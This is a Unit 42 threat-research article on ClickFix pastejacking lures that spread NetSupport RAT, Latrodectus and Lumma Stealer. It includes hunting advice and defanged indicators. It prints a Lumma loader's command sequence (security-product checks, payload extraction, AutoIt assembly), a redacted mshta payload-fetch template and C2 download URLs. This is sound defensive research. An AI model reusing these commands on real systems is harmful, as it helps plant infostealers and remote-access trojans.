---
title: "Fix the Click: Preventing the ClickFix Attack Vector"
source: "https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/"
site_name: Unit 42
canonical_url: "https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/"
language: en-US
domdown_version: 0.3.11
image: "https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/11_Cybercrime_Category_1920x900.jpg"
author:
  - "Rem Dudas, Noa Dekel"
published: "2025-07-10T10:00:43+00:00"
description: "ClickFix campaigns are on the rise. We highlight three that distributed NetSupport RAT, Latrodectus, and Lumma Stealer malware."
---
# Fix the Click: Preventing the ClickFix Attack Vector

![Clock Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg)

min read

Related Products

[Advanced DNS Security](https://unit42.paloaltonetworks.com/product-category/advanced-dns-security/)

[Advanced URL Filtering](https://unit42.paloaltonetworks.com/product-category/advanced-url-filtering/)

[Advanced WildFire](https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/)

[Cloud-Delivered Security Services](https://unit42.paloaltonetworks.com/product-category/cloud-delivered-security-services/)

[Cortex](https://unit42.paloaltonetworks.com/product-category/cortex/)

[Cortex XDR](https://unit42.paloaltonetworks.com/product-category/cortex-xdr/)

[Cortex XSIAM](https://unit42.paloaltonetworks.com/product-category/cortex-xsiam/)

[Unit 42 Incident Response](https://unit42.paloaltonetworks.com/product-category/unit-42-incident-response/)

## Executive Summary

In this article, we share hunting tips and mitigation strategies for ClickFix campaigns and provide an inside view of some of the most prominent ClickFix campaigns we have seen so far in 2025:

- Attackers distributing NetSupport remote access Trojan (RAT) are ramping up activities with a new loader
- Attackers distributing Latrodectus malware are luring victims with a new ClickFix campaign
- Prolific Lumma Stealer campaign targeting multiple industries with new techniques

ClickFix is an increasingly popular technique that threat actors use in social engineering lures. This technique tricks potential victims into executing malicious commands, under the pretense of conducting “quick fixes” for common computer issues.

These campaigns use the reputations of legitimate products and services to hide their activities in a way that makes them more difficult to spot. This does not imply that the author of the executable file is at fault or liable for the outcome caused by the malware.

ClickFix campaigns have impacted organizations in a wide variety of industries, including:

- High technology
- Financial services
- Manufacturing
- Wholesale and retail
- State and local government
- Professional and legal services
- Utilities and energy

Unit 42 has recently assisted in almost a dozen incident response cases in which a ClickFix lure was the initial access vector.

An effective ClickFix lure could enable threat actors to perform a complete takeover of the targeted organization. These lures can be fairly simple for threat actors to prepare, leaving organizations susceptible to credential gathering, mail theft and even ransomware incidents.

We identified two variations of this technique:

- Instructing a target to run malicious commands in the Run window by pressing Windows Key + R (Win+R)
- Instructing a potential victim to run malicious commands in a terminal window by pressing Windows Key + X (Win+X)

Palo Alto Networks customers are better protected from the threats described here through the following products and services:

- [Advanced WildFire](https://www.paloaltonetworks.com/network-security/advanced-wildfire)
- [Advanced URL Filtering](https://www.paloaltonetworks.com/network-security/advanced-url-filtering) and [Advanced DNS Security](https://www.paloaltonetworks.com/network-security/advanced-dns-security)
- [Cortex XDR](https://docs-cortex.paloaltonetworks.com/p/XDR) and [XSIAM](https://docs-cortex.paloaltonetworks.com/p/XSIAM)

If you think you might have been compromised or have an urgent matter, contact the [Unit 42 Incident Response team](https://start.paloaltonetworks.com/contact-unit42.html).

| **Related Unit 42 Topics** | [Social Engineering](https://unit42.paloaltonetworks.com/tag/social-engineering/), **[Malware](https://unit42.paloaltonetworks.com/category/malware/)**,[Malvertising](https://unit42.paloaltonetworks.com/tag/malvertising/) |
| --- | --- |

## Dissecting the ClickFix Technique

Before we examine the ClickFix technique, we must better understand what ClickFix is and how prevalent it has become in recent months.

ClickFix is a relatively new social engineering technique that threat actors increasingly use in attack campaigns. This technique misleads targeted users into applying “quick fixes” to common computer issues, such as performance issues, missing drivers or pop-up errors. In recent months, many of the lures using the ClickFix technique have been fake verification pages asking victims to complete an action before supposedly continuing to the viewer's intended destination.

Threat actors often deliver these lures through:

- Legitimate but compromised websites
- Malvertising
- YouTube tutorials
- Fake tech support forums

The ClickFix technique relies on [clipboard hijacking](https://www.malwarebytes.com/blog/news/2025/03/fake-captcha-websites-hijack-your-clipboard-to-install-information-stealers). Webpages using ClickFix inject malicious script or commands into a potential victim's clipboard and provide instructions to paste and run the malicious content. Because the ClickFix technique asks users to paste the content, this is sometimes referred to as “pastejacking.”

Attackers use the ClickFix technique as an initial infection vector and the payloads that follow it vary — some lures drop infostealers, others deploy RATs or disable security tools. But all rely on convincing the victim to do the attacker’s job for them: running the code manually.

This delivery method bypasses many standard detection and prevention controls. There is no exploit, phishing attachment or malicious link. Instead, potential victims unknowingly run the command themselves, through a trusted system shell.

This method makes infections from ClickFix more complicated to detect than drive-by downloads or traditional malware droppers. However, researchers can still look for artifacts to detect these infections.

### The Rise of a Global Phenomenon

We have been closely monitoring ClickFix lures in recent months and have found scores of variants that deliver multiple malware families. Figure 1 shows the distribution of cases per week.

![Bar chart showing the count of events by week, from week starting 2024-12-30 to 2025-05-12. Event counts range from a low of 1 to a high of 126. Major peaks are noted at week starting 2025-01-27 with 121 events and 2025-03-24 with 126 events.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/chart-1.png)

Figure 1. Weekly infection instances since the beginning of 2025.

Our researchers also noted the impact of ClickFix across a wide variety of business sectors, as shown in Figure 2.

![Bar graph showing the count of entities by industry. Industries represented from highest to lowest counts are: High Technology, Financial Services, Manufacturing, Wholesale and Retail, State and Local Government, Professional and Legal Services, Utilities and Energy, Pharma and Life Sciences, Hospitality, Telecommunications, Healthcare, Federal Government, Education. Palo Alto Networks and Unit 42 logo lockup.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-762309-145728-2.png)

Figure 2. Distribution of industries affected by ClickFix lures.

## Case Studies

Three of the most prominent campaigns we have observed so far in 2025 show how threat actors have integrated ClickFix into the attack flow of various malware families.

### NetSupport RAT Switches Up Its Loading

During ClickFix-related activity hunting, we identified one particularly prolific campaign that was active in May 2025. In this campaign, attackers using NetSupport RAT impacted various industries, including:

- Healthcare
- Legal services
- Telecommunications
- Retail
- Mining

This ClickFix campaign distributing NetSupport RATs leverages distribution domains that masquerade as legitimate and popular services:

- DocuSign: A digital platform for signing, sending and managing documents electronically.
- Okta: A platform that helps companies manage and secure user access to applications and systems. It provides single sign-on (SSO), multifactor authentication and identity management services.

Threat actors often abuse, take advantage of or subvert legitimate products for malicious purposes. This does not imply that the legitimate product is flawed or malicious.

Figures 3 and 4 show the fake DocuSign and Okta landing pages:

![Spoofed landing page for PandaDoc, discussing the document signing alternative, highlighting ease and cost-effectiveness, with various industry badges and logos of trusted brands.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-765935-145728-3.png)Figure 3. Fake landing page for DocuSign at docusign.sa[.]com.![A screenshot of a spoofed security verification page featuring a checkbox labeled "Verify you are human" with a Cloudflare logo below it. The text explains that the site needs to review the security of your connection before proceeding.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-769189-145728-4.png)Figure 4. Fake landing page for Okta at oktacheck.it[.]com.We suspect this ClickFix campaign distributes NetSupport RAT over [ClearFake](https://reliaquest.com/blog/new-execution-technique-in-clearfake-campaign/) infrastructure. Our suspicion is based on the similarities between the ClickFix lure and ClearFake infrastructure. Both contain the same Russian comments and use identical JavaScript clipboard injection functionality.

ClearFake is a malicious JavaScript framework deployed on compromised websites as part of drive-by download campaigns used by other malware strains. Figure 5 shows ClearFake injecting an encoded PowerShell command using the JavaScript function unsecuredCopyToClipboard. The figure also shows comments in Russian within the code, giving us clues to the ClearFake developer’s origins.

![A screenshot split into two sections showing verification steps on the left and computer code on the right. On the left, an orange interface instructs the user to complete verification steps like pressing and holding windows key and R, and verifying by pressing Enter. This is the first step. On the right, a coding interface with lines of code in red and black colors, notes in Russian, indicating modifications to a PowerShell command. The second step is the obfuscated PowerShell command injected to a user's keyboard. ](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-772900-145728-5.png)

Figure 5. Landing page and script injection in a fake DocuSign page.

The fake verification window displays instructions to open the Run dialog and then paste the clipboard contents into it, with the interface presenting these instructions as a test to prove that the user is human. The victim might be unaware of the malicious PowerShell command that the website subsequently injects (as mentioned above, this is an example of [pastejacking](https://github.com/dxa4481/Pastejacking)).

Once executed, the command downloads another PowerShell script that downloads and executes the next stage in the attack. The infection chain is mapped out in Figure 6.

![Flowchart illustrating a cyber attack involving fake Okta website prompts, execution of Cmd.exe, and PowerShell to download and run malicious software including NetSupport RAT and various executable files, leading to data injection and exfiltration.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-776936-145728-6.png)

Figure 6. The NetSupport RAT infection chain.

The next stage is contained within a ZIP archive, which includes all the legitimate dependencies required to execute jp2launcher.exe. This file is a legitimate Java Runtime Environment (JRE) component used to launch Java applications, as Figure 7 shows.

![Screenshot of a computer screen displaying a list of files primarily related to Microsoft Windows components and applications. Each file entry shows the file name, modification date, type, and size. Three rows are highlighted in a red box.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-780885-145728-7.png)

Figure 7. Contents of the ZIP archive downloaded by cmd.exe.

First, cmd.exe downloads the ZIP archive, extracts its content and saves that content in the %APPDATA%/Local/Temp/ directory. Then, cmd.exe launches jp2launcher.exe, which sideloads a malicious loader named msvcp140.dll. The [Appendix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/#post-145728-_zctlzocvrsya) of this article provides a full technical analysis of the new DLL-based NetSupport RAT loader**.**

Finally, the DLL downloads and executes a ZIP archive that contains NetSupport RAT (client32.exe) and associated files. NetSupport RAT is legitimate software, but out-of-date or stolen copies are often misused by [different threat actors](https://blogs.vmware.com/security/2023/11/netsupport-rat-the-rat-king-returns.html), usually configured as a RAT for infiltration and endpoint infection.

### Latrodectus Spins New ClickFix Lures

During March-April 2025, we noticed an increasing amount of traffic to Latrodectus-controlled domains. We also saw a shift in infection strategy, as attackers distributing Latrodectus started to use the ClickFix technique in their initial access vectors.

This Latrodectus attack chain begins when a person visits a legitimate, but compromised website. Then, ClearFake infrastructure redirects the site visitor to a fake verification page. This page presents a prompt instructing the viewer to run a command via the Run dialog, while the malicious JavaScript backend injects a PowerShell command into the endpoint’s clipboard.

Figure 8 below shows the lure and the subsequent redirection chain from the compromised site.

![Screenshot of a computer screen displaying a captcha verification page instructing the user to complete steps using keyboard shortcuts. The screen also shows web development tools open in the browser with various script names visible.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-784062-145728-8.png)

Figure 8. Latrodectus ClickFix lure.

When victims paste and execute the injected command, they do not see the command itself. What they do see is the final comment at the end of the script (Cloud Identificator: 2031), which looks like part of a normal authentication process. However, upon execution, the script uses curl.exe to download a JavaScript file from a command-and-control (C2) server. It then executes the file via Cscript, as Figure 9 shows.

![Code snippet with syntax highlighting in dark mode, with some redactions for privacy.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-790200-145728-9.png)

Figure 9. A malicious command injected from a ClickFix lure onto the target’s clipboard.

Since its emergence in mid-2024, attackers have frequently delivered Latrodectus through a chain that includes a malicious JavaScript file downloading a Microsoft Software Installer (MSI) file that drops Latrodectus. In this case, the executed JavaScript file (la.txt) retrieves an MSI file from a remote server and runs it using msiexec.exe.

Unlike earlier campaigns where the JavaScript downloader was typically bloated and obfuscated with nonsensical comments, this variant employs large junk JSON variables that have seemingly legitimate names, such as var_Apple_Palantir38 and func_Slack_encryption84. Figure 10 shows a comparison of the obfuscation techniques used in past and recent Latrodectus campaigns.

![Two side-by-side images displaying coding scripts: the left shows a code snippet with variables and functions, while the right features a code block with a loop and conditional statements.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-793783-145728-10.png)

Figure 10. Comparison between recent (left) and older (right) obfuscation techniques used in Latrodectus droppers.

The MSI payload drops several files onto the victim’s disk. These include [Latrodectus](https://www.virustotal.com/gui/file/aef5c150cfe8154ed290b293e30d552cfb9b40b3552369345c7c2f135b63aac4/relations), which is dropped as a malicious DLL file (libcef.dll), and a legitimate binary that sideloads the DLL. This is demonstrated in Figure 11.

![Diagram of the Latrodectus infection chain, starting with a compromised legitimate website and moving through the ClickFix tactic, leading to the downloading and execution of an EXE file and malicious shell code. ](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/image5.png)

Figure 11. The Latrodectus infection chain.

When the legitimate file side-loads the malicious DLL for Latrodectus, it injects shellcode into itself.

In a May 2025 [Timely Threat Intelligence post,](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-05-16-IOCs-on-recent-ClickFix-activity.txt) we analyzed a similar Latrodectus campaign, in which Lumma Stealer was the final payload of the full attack chain.

### Lumma Stealer Typosquatting Campaign

While attackers distributing Lumma Stealer started using the ClickFix infection technique [in late 2024](https://www.esentire.com/security-advisories/lumma-stealer-clickfix-distribution), we have seen a surge in ClickFix infection attempts for Lumma Stealer as recently as April 2025. In recent campaigns, attackers distributing Lumma Stealer have impacted a broad range of sectors, including:

- Automotive
- Energy
- IT
- Software

Our investigation into one of these ClickFix campaigns revealed that targets are prompted to copy a unique MSHTA command with the following structure: mshta xxxx[.]co/xxxxxx =+\xxx.

The attackers give each target a specific identifier string, which they can use to receive the payload once. However, the URIs our researchers checked were no longer delivering the payloads post-infection.

Upon executing the ClickFix script, the script redirects the viewer to a [typosquatted](https://unit42.paloaltonetworks.com/cybersquatting/) version of the IP Logger domains iplogger[.]org and iplogger[.]com. IP Logger is a URL shortening and IP tracking service that creates links to log information about visitors, such as:

- IP addresses
- Geolocation
- Device details
- Browsing behavior

The typosquatted domain controlled by the attackers is iplogger[.]co, and the page for this domain is disguised as a known and legitimate service.

In all instances of the campaign, we observed that the MSHTA command downloaded an encoded PowerShell script, which initiated a Lumma Stealer infection. Figure 12 demonstrates the entire infection chain.

![Lumma Stealer infection depicting the process of a malware attack involving entities like ClickFix, Encoded PowerShell, Lumma Stealer, and various functions like contacting Command and Control (C2) server, building executables, and detecting security products. The chart shows connections and actions such as resource dropping and execution commands throughout the attack lifecycle.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-807023-145728-13.png)

Figure 12. The Lumma Stealer infection chain.

Each attacker-controlled link hosts a heavily obfuscated and Base64-encoded PowerShell command that ultimately leads to the drop and execution of a malicious Lumma Stealer stager named PartyContinued.exe. This executable is hosted at: hxxps[:]//pub-&lt;dynamically generated number string>.r2[.]dev and is named to seem like a legitimate developer URL.

When PartyContinued.exe launches, it sets up a new Lumma loading method that uses a scripting language called [AutoIt](https://www.autoitscript.com/wiki/AutoIt_and_Malware). This version of Lumma Stealer is similar to earlier versions but includes a new Microsoft cabinet archive (CAB) file named Boat.pst. This CAB file is bundled inside PartyContinued.exe and holds the rest of the content that is used to create an AutoIt3 script engine and an AutoIt script it executes for Lumma Stealer.

Table 1 summarizes the commands executed by the loader and their purpose:

| **Command** | **Description** | **Purpose** |
| --- | --- | --- |
| tasklist \| findstr /I "opssvc wrsa" | Performs a case-insensitive search foropssvcorwrsain the name of a running process. | Endpoint security software detection |
| tasklist \| findstr "bdservicehost SophosHealth AvastUI AVGUI nsWscSvc ekrn" | Searches for various strings in the running processes. | Endpoint security software detection |
| cmd /c md 386354 | Creates a directory for saving the malware to disk. | Set location for payload extraction |
| extrac32 /Y /E Boat.pst | Extracts files from the.cabfile namedBoat.pst, overwriting existing files (/Y) and extracting all files (/E). | Payload extraction |
| set /p ="MZ" > 386354\Slovenia[.]com &lt;nul | Creates a file namedSlovenia[.]comunder the386354directory containing two bytes for the charactersMZ. | Construct the AutoIt3 executor |
| findstr /V "Tr" Bell >> 386354\Slovenia[.]com | Appends all lines in the extracted file namedBellthat do not contain the stringTr(case-sensitive) to the fileSlovenia[.]com. | Construct the AutoIt3 executor |
| cmd /c copy /b 386354\Slovenia[.]com + Sewing + Monetary + Covered + Health + Loss + Intel + Escape + Tramadol + Apparatus 386354\Slovenia[.]com | Appends other extracted files to finish creating a binary file usingcopy /b. The result is a copy ofAutoIt3.exe, which is namedSlovenia[.]com. | Construct the AutoIt3 executor |
| cmd /c copy /b ..\Presently.pst + ..\Instantly.pst + ..\Roy.pst + ..\Tolerance.pst + ..\Mailto.pst + ..\Marco.pst + ..\Mint.pst G | Creates a binary namedGthatSlovenia[.]comwill run as an AutoIt v3 compiled script (.a3x). | Construct the Lumma Stealer payload (binary run as an.a3xfile |
| start Slovenia[.]com G | Command for the AutoIt3 executor to run the binary for Lumma Stealer as an.a3xfile. | Load/run Lumma Stealer |
| choice /d y /t 5 | Command to select yes (y) for the default option (/d) for commands in the.batfile after waiting five seconds (/t 5). | Allows Lumma Stealer to run without any user interaction |

Table 1. Commands executed by the loader for Lumma Stealer.

As shown in the table, Slovenia[.]com is a copy of the AutoIt3 script engine AutoIt3.exe that executes a binary run as an AutoIt script (.a3x) named G, which is responsible for the next stages of the attack. This version of Latrodectus harvests sensitive information, including Chromium-based browser passwords, and attempts to exfiltrate them to a C2 server at sumeriavgv[.]digital.

## Hunting for ClickFix Infections

ClickFix attacks often leave easily detectable traces, especially when the people who view these lures are unfamiliar with opening administrative interfaces, making them more likely to paste a malicious command string into a Run window.

### Reviewing RunMRU Artifacts

Windows maintains a registry key that stores the most recently executed commands from the Run window (Win + R), called RunMRU:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

This registry key saves any commands that are executed from the Run window, enabling analysts to parse these entries to look for signs of suspicious usage.

Some key indicators for suspicious RunMRU contents could be:

- Obfuscated content
- Keywords related to the download and execution of payloads from unknown or suspicious domains
- Keywords indicating calls to administrative interfaces

These entries indicate that someone might have manually triggered such commands, which is consistent with a ClickFix infection flow.

### Detecting Win + X ClickFix

Some attackers aim to avoid exposing their activity in the RunMRU registry key. They instead present instructions to launch a terminal for PowerShell (Windows 11) or Command Prompt (Windows 10) via Win+X for the Quick Access Menu. A [March 2025 report](https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2) reveals that attackers distributing Havoc used this Win+X variation of ClickFix.

Threat hunters can look for signs of this Win+X ClickFix technique using EDR telemetry or Windows Event Logs — specifically:

- **Security event ID 4688 (Process Creation):**Look for powershell.exe spawned by explorer.exe, in correlation with Event ID 4663 (Object Access) of files under the %LocalAppData%\Microsoft\Windows\WinX\ folder.
- **Shell usage patterns:** Elevated PowerShell sessions invoked shortly after interactive logins, followed by network connections or suspicious child processes (e.g., certutil.exe, mshta.exe and rundll32.exe), are often red flags.
- **Clipboard monitoring:** Since ClickFix lures rely on potential victims pasting malicious content from the clipboard, we can correlate paste activity with PowerShell execution shortly after the user types Win+X.

## Conclusion

The ClickFix technique is a growing threat, with dynamically shifting approaches in its implementation. Threat actors leverage ClickFix in attacks against organizations, exploiting human error for propagation and persistence.

This article explored three prominent ClickFix campaigns — NetSupport RAT, Latrodectus and Lumma Stealer — all of which are constantly adapting and incorporating new techniques.

Practical methodologies for hunting and detecting ClickFix lures include investigating EDR telemetry or Windows Event Logs for suspicious events, activities and patterns.

Proactively addressing this evolving threat is vital to the ongoing security of organizations. To this end, efforts should be made to increase awareness by educating personnel to be wary of ClickFix lures. This should be done while also setting up defense and monitoring measures based on our hunting suggestions.

Palo Alto Networks customers are better protected from the threats discussed above through the following products:

- [Advanced WildFire](https://www.paloaltonetworks.com/network-security/advanced-wildfire)
- [Advanced URL Filtering](https://www.paloaltonetworks.com/network-security/advanced-url-filtering) and [Advanced DNS Security](https://www.paloaltonetworks.com/network-security/advanced-dns-security) detect ClickFix attacks, such as those discussed in this blog, with our offline security web crawlers by detecting malicious commands injected into the clipboard buffer by malicious JavaScript
- [Cortex XDR](https://docs-cortex.paloaltonetworks.com/p/XDR) and [XSIAM](https://docs-cortex.paloaltonetworks.com/p/XSIAM) prevent all campaigns and malware discussed in this article through the Behavioral Threat Protection module

If you think you may have been compromised or have an urgent matter, get in touch with the[Unit 42 Incident Response team](https://start.paloaltonetworks.com/contact-unit42.html) or call:

- North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)
- UK: +44.20.3743.3660
- Europe and Middle East: +31.20.299.3130
- Asia: +65.6983.8730
- Japan: +81.50.1790.0200
- Australia: +61.2.4062.7950
- India: 00080005045107

Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the [Cyber Threat Alliance](https://www.cyberthreatalliance.org).

## Indicators of Compromise

### SHA256 Hashes From Lumma Stealer Example

- Filename PartyContinued.exe: 2bc23b53bb76e59d84b0175e8cba68695a21ed74be9327f0b6ba37edc2daaeef
- Filename Boat.pst (a CAB file): 06efe89da25a627493ef383f1be58c95c3c89a20ebb4af4696d82e729c75d1a7

### Domains From Lumma Stealer Example

- iplogger[.]co
- stuffgull[.]top
- sumeriavgv[.]digital
- pub-164d8d82c41c4e1b871bc21802a18154.r2[.]dev
- pub-626890a630d8418ea6c2ef0fa17f02ef.r2[.]dev
- pub-164d8d82c41c4e1b871bc21802a18154.r2[.]dev
- pub-a5a2932dc7f143499b865f8580102688.r2[.]dev
- pub-7efc089d5da740a994d1472af48fc689.r2[.]dev
- agroeconb[.]live
- animatcxju[.]live

### SHA256 Hashes From Latrodectus Example

- Filename libecf.dll: 5809c889e7507d357e64ea15c7d7b22005dbf246aefdd3329d4a5c58d482e7e1
- PowerShell Downloader: 52e6e819720fede0d12dcc5430ff15f70b5656cbd3d5d251abfc2dcd22783293
- JavaScript Downloader: 57e75c98b22d1453da5b2642c8daf6c363c60552e77a52ad154c200187d20b9a
- JavaScript Downloader: 33a0cf0a0105d8b65cf62f31ec0a6dcd48e781d1fece35b963c6267ab2875559

### C2 URLs From Latrodectus Example

- hxxps[:]//webbs[.]live/on/
- hxxps[:]//diab[.]live/up/
- hxxps[:]//mhbr[.]live/do/
- hxxps[:]//decr[.]live/j/
- hxxps[:]//lexip[.]live/n/
- hxxps[:]//rimz[.]live/u/
- hxxps[:]//byjs[.]live/v/
- hxxps[:]//btco[.]live/r/
- hxxps[:]//izan[.]live/r/
- hxxps[:]//k.veuwb[.]live/234
- hxxps[:]//r.netluc[.]live
- heyues[.]live
- hxxps[:]//k.mailam[.]live/234234

### SHA256 Hashes From NetSupport RAT Example

- Filename data_3.bin (XOR encrypted stager): 5C762FF1F604E92ECD9FD1DC5D1CB24B3AF4B4E0D25DE462C78F7AC0F897FC2D
- Filename data_4.bin (XOR encrypted shellcode): 9DCA5241822A0E954484D6C303475F94978B6EF0A016CBAE1FBA29D0AED86288
- Filename msvcp140.dll (loader): CBAF513E7FD4322B14ADCC34B34D793D79076AD310925981548E8D3CFF886527
- NetSupport Loader Mutex: nx0kFgSPY8SDVhOMjmNgW
- libsqlite3-0.dll: 506ab08d0a71610793ae2a5c4c26b1eb35fd9e3c8749cd63877b03c205feb48a
- File location C:\ProgramData\SecurityCheck_v1\client32.exe: 3ACC40334EF86FD0422FB386CA4FB8836C4FA0E722A5FCFA0086B9182127C1D7

### Domains for the Loader From the NetSupport RAT Example

- oktacheck.it[.]com
- doccsign.it[.]com
- docusign.sa[.]com
- dosign.it[.]com
- loyalcompany[.]net
- leocompany[.]org
- 80.77.23[.]48
- mhousecreative[.]com

### C2 Domains From the NetSupport RAT Example

- mh-sns[.]com
- lasix20[.]com

## Additional Resources

- [Lampion Is Back With ClickFix Lures](https://unit42.paloaltonetworks.com/lampion-malware-clickfix-lures/) — Unit 42, Palo Alto Networks
- [New ClickFix activity](https://x.com/Unit42_Intel/status/1924866530195427372) — Unit 42, Palo Alto Networks
- [From Shadow to Spotlight: The Evolution of Lumma Stealer and Its Hidden Secrets](https://www.cybereason.com/blog/threat-analysis-lummastealer-2.0) — CyberReason
- [NetSupport RAT Clickfix Distribution](https://www.esentire.com/security-advisories/netsupport-rat-clickfix-distribution) — Esentire
- [Lumma Stealer ClickFix Distribution](https://esentire.com/security-advisories/lumma-stealer-clickfix-distribution) — Esentire
- [DeepSeek ClickFix Scam Exposed!](https://www.cloudsek.com/blog/deepseek-clickfix-scam-exposed-protect-your-data-before-its-too-late) — CloudSEK
- [ClearFake: a newcomer to the “fake updates” threats landscape](https://blog.sekoia.io/clearfake-a-newcomer-to-the-fake-updates-threats-landscape/) — Sekoia
- [Havoc: SharePoint with Microsoft Graph API turns into FUD C2](https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2) — Fortinet

## Appendix: Technical Analysis of the New NetSupport RAT Loader

This section dives into the new DLL-based NetSupport RAT loader, which presents a greater challenge to analysts than previous campaigns. In the past, NetSupport RAT was loaded by [script loaders](https://securelist.com/horns-n-hooves-campaign-delivering-netsupport-rat/114740/) with relatively short infection chains, whereas this loader adds a level of stealth and complexity to the attack.

The example we analyze here is named [msvcp140.dll](https://www.virustotal.com/gui/file/cbaf513e7fd4322b14adcc34b34d793d79076ad310925981548e8d3cff886527). This DLL file is sideloaded by a legitimate executable named [jp2launcher.exe](https://www.virustotal.com/gui/file/1fc684c5adf02b5a96cc407932429f1c2d3d2e78e3104cfbcf535a9de1ee4921).

This DLL uses several techniques to hinder analysis, such as:

- Dynamic API resolving
- Data encryption
- Code obfuscation

For example, after being sideloaded by jp2launcher.exe, the DLL writes the code of its following stages byte-by-byte on the stack. After this, it deobfuscates and executes the code.

After the initial deobfuscation, the DLL retrieves encrypted binaries named data_3.bin and data_4.bin from the C2 server via curl.exe and drops the payloads to disk in the same working directory. Figure 13 shows the construction of the curl.exe command to download one of the payloads.

![Screenshot of HTML with syntax highlighting showing various commands and such as mov and push.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-810756-145728-14.png)

Figure 13. Malicious msvcp140.dll loader constructs curl commands to download .bin files shown in x64dbg debugger.

The loader saves both data_3.bin and data_4.bin to disk as encrypted binaries, then decrypts them in memory using a rolling XOR key, which is https://google[.]com/. The loader then injects the decrypted code into a child process of jp2launcher.exe.

The decrypted code from data_4.bin is a relatively small shellcode that loads decrypted code from data_3.bin. This binary is a fully formed PE that downloads the final NetSupport RAT package as a ZIP archive from the attacker’s C2 server and unzips it in memory. Figure 14 shows the loader’s request to hxxp[:]//80.77.23[.]48/service/settings/5702b2a25802ff1b520c0d1e388026f8074e836d4e69c10f9481283f886fd9f4. The request contains a unique user agent.

![Screenshot of a computer log detailing HTTP server requests with timestamps and server responses.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-814189-145728-15.png)

Figure 14. jp2launcher.exe download request from C2, downloading client32.exe.

The final payload is a ZIP archive that contains NetSupport RAT and all of its required dependencies. The loader drops NetSupport RAT into C:\ProgramData\SecurityCheck_v1\ and executes its main binary, client32.exe.

The loader then sets up persistence for the RAT by creating a scheduled task that executes client32.exe whenever a user logs in.

In the process of statically analyzing the loader, we noticed a unique PDB path, indicating that this DLL is part of a certain series of MsiShell tools. Pivoting on this path, we found another instance of the campaign. In this case it used legitimate file transfer software, filezilla.exe and sideloaded another version of the loader, libsqlite3-0.dll. Figure 15 shows the similarity between the PDB paths of the two loader versions.

![Two screenshots showing file paths and GUIDs for software projects, both of them being Debug Artifacts. Each item is highlighted in red.](https://unit42.paloaltonetworks.com/wp-content/uploads/2025/07/word-image-817812-145728-16.png)

Figure 15. PDB paths of both NetSupport RAT loader versions.

_Updated July 10, 2025, at 8:05 a.m. PT._